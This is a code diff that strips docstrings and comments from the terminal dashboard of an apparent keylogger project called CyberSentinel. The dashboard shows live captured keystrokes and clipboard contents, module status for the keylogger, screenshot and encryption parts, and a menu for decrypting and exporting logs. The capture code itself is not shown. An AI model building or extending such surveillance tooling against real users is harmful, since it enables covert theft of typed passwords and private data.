@@ -1,19 +1,3 @@
-"""
-CyberSentinel - Rich Terminal Dashboard
-==========================================
-Beautiful real-time monitoring dashboard built
-with the Rich library. Displays live keystroke
-capture, system stats, and module status.
-
-Features:
-    - Real-time keystroke display
-    - Live session statistics
-    - Module health indicators
-    - System resource meters
-    - Clipboard capture feed
-    - Beautiful theming and layout
-"""
-
 import time
 import threading
 from datetime import datetime, timedelta
@@ -61,10 +45,6 @@ console = Console()
 
 
 class Dashboard:
-    """
-    Real-time monitoring dashboard using Rich Live display.
-    Renders a beautiful terminal UI with live-updating panels.
-    """
 
     def __init__(self, keylogger=None, clipboard=None, screenshot=None, encryption=None):
         self.keylogger = keylogger
@@ -74,7 +54,6 @@ class Dashboard:
         self._running = False
 
     def show_banner(self):
-        """Display the application banner."""
         banner_text = Text(BANNER, style=f"bold {THEME_PRIMARY}")
         console.print(
             Panel(
@@ -95,13 +74,11 @@ class Dashboard:
         console.print()
 
     def show_system_info(self, profiler):
-        """Display system information panel."""
         profile = profiler.collect_all()
         os_info = profile["os_info"]
         hw = profile["hardware"]
         net = profile["network"]
 
-        # System Info Table
         table = Table(
             title="🖥️  System Profile",
             box=box.ROUNDED,
@@ -131,7 +108,6 @@ class Dashboard:
         console.print()
 
     def show_log_review(self, file_handler):
-        """Display log file review panel."""
         files = file_handler.list_log_files()
 
         table = Table(
@@ -168,7 +144,6 @@ class Dashboard:
         console.print()
         console.print(table)
 
-        # Storage stats
         stats = file_handler.get_storage_stats()
         console.print(
             f"\n  [dim]📁 Total: {stats['total_files']} files  |  "
@@ -178,10 +153,6 @@ class Dashboard:
         console.print()
 
     def start_live_monitor(self):
-        """
-        Start the live monitoring dashboard.
-        This is the main real-time display mode.
-        """
         self._running = True
 
         try:
@@ -207,40 +178,33 @@ class Dashboard:
             self._running = False
 
     def stop(self):
-        """Stop the live dashboard."""
         self._running = False
 
     def _generate_layout(self) -> Layout:
-        """Generate the complete dashboard layout."""
         layout = Layout()
 
-        # Main structure
         layout.split_column(
             Layout(name="header", size=5),
             Layout(name="body", ratio=1),
             Layout(name="footer", size=3),
         )
 
-        # Body split
         layout["body"].split_row(
             Layout(name="left", ratio=2),
             Layout(name="right", ratio=1),
         )
 
-        # Left column
         layout["left"].split_column(
             Layout(name="keystroke_panel", ratio=3),
             Layout(name="clipboard_panel", ratio=1),
         )
 
-        # Right column
         layout["right"].split_column(
             Layout(name="stats_panel", ratio=2),
             Layout(name="modules_panel", ratio=1),
             Layout(name="system_panel", ratio=1),
         )
 
-        # Populate panels
         layout["header"].update(self._render_header())
         layout["keystroke_panel"].update(self._render_keystroke_panel())
         layout["clipboard_panel"].update(self._render_clipboard_panel())
@@ -252,10 +216,8 @@ class Dashboard:
         return layout
 
     def _render_header(self) -> Panel:
-        """Render the dashboard header."""
         now = datetime.now()
 
-        # Calculate session duration
         elapsed = ""
         if self.keylogger and self.keylogger.start_time:
             delta = now - self.keylogger.start_time
@@ -292,17 +254,14 @@ class Dashboard:
         )
 
     def _render_keystroke_panel(self) -> Panel:
-        """Render the live keystroke capture panel."""
         if not self.keylogger:
             content = Text("[dim]Keylogger not initialized[/]", justify="center")
         else:
             recent = self.keylogger.get_recent_keys(MAX_DISPLAY_KEYS)
             if recent:
-                # Build styled text from recent keys
                 text = Text()
                 for key in recent:
                     if key.startswith(" [") and key.endswith("] "):
-                        # Special key
                         text.append(key, style=f"bold {THEME_SECONDARY}")
                     elif key == " [ENTER]\n":
                         text.append(" ↵\n", style=f"bold {THEME_WARNING}")
@@ -330,7 +289,6 @@ class Dashboard:
         )
 
     def _render_clipboard_panel(self) -> Panel:
-        """Render the clipboard monitoring panel."""
         if not self.clipboard:
             content = Text("[dim]Clipboard monitor not initialized[/]", justify="center")
         else:
@@ -369,7 +327,6 @@ class Dashboard:
         )
 
     def _render_stats_panel(self) -> Panel:
-        """Render session statistics panel."""
         table = Table(
             box=None,
             show_header=False,
@@ -418,7 +375,6 @@ class Dashboard:
         )
 
     def _render_modules_panel(self) -> Panel:
-        """Render module status panel."""
         table = Table(
             box=None,
             show_header=True,
@@ -429,7 +385,6 @@ class Dashboard:
         table.add_column("Module", style="bold white", ratio=1)
         table.add_column("Status", width=12, justify="center")
 
-        # Keylogger status
         kl_running = self.keylogger and self.keylogger.is_running
         kl_status = (
             f"[bold {THEME_ACCENT}]● ON[/]"
@@ -438,7 +393,6 @@ class Dashboard:
         )
         table.add_row("⌨️  Keylogger", kl_status)
 
-        # Clipboard status
         cb_running = self.clipboard and self.clipboard.is_running
         cb_status = (
             f"[bold {THEME_ACCENT}]● ON[/]"
@@ -447,7 +401,6 @@ class Dashboard:
         )
         table.add_row("📋 Clipboard", cb_status)
 
-        # Screenshot status
         ss_running = self.screenshot and self.screenshot.is_running
         ss_status = (
             f"[bold {THEME_ACCENT}]● ON[/]"
@@ -456,7 +409,6 @@ class Dashboard:
         )
         table.add_row("📸 Screenshot", ss_status)
 
-        # Encryption status
         enc_active = self.encryption and self.encryption.enabled
         enc_status = (
             f"[bold {THEME_ACCENT}]● ON[/]"
@@ -474,7 +426,6 @@ class Dashboard:
         )
 
     def _render_system_panel(self) -> Panel:
-        """Render system resource panel."""
         table = Table(
             box=None,
             show_header=False,
@@ -505,7 +456,6 @@ class Dashboard:
         )
 
     def _render_footer(self) -> Panel:
-        """Render the dashboard footer."""
         footer = Text()
         footer.append("  [Ctrl+C] ", style=f"bold {THEME_WARNING}")
         footer.append("Stop Monitoring", style="white")
@@ -523,7 +473,6 @@ class Dashboard:
 
     @staticmethod
     def _make_bar(percent: float, width: int = 8) -> str:
-        """Create a text-based progress bar."""
         filled = int(width * percent / 100)
         empty = width - filled
 
@@ -537,7 +486,6 @@ class Dashboard:
         return f"[{color}]{'█' * filled}{'░' * empty}[/{color}]"
 
     def show_decrypt_menu(self, file_handler):
-        """Interactive menu for decrypting and exporting logs."""
         console.print()
         console.print(
             Rule(
@@ -555,10 +503,8 @@ class Dashboard:
             )
             return
 
-        # Show files
         self.show_log_review(file_handler)
 
-        # Export menu
         console.print(
             f"\n  [{THEME_ACCENT}]Export formats:[/]"
             f"\n    [bold]1.[/] TXT  - Plaintext readable format"
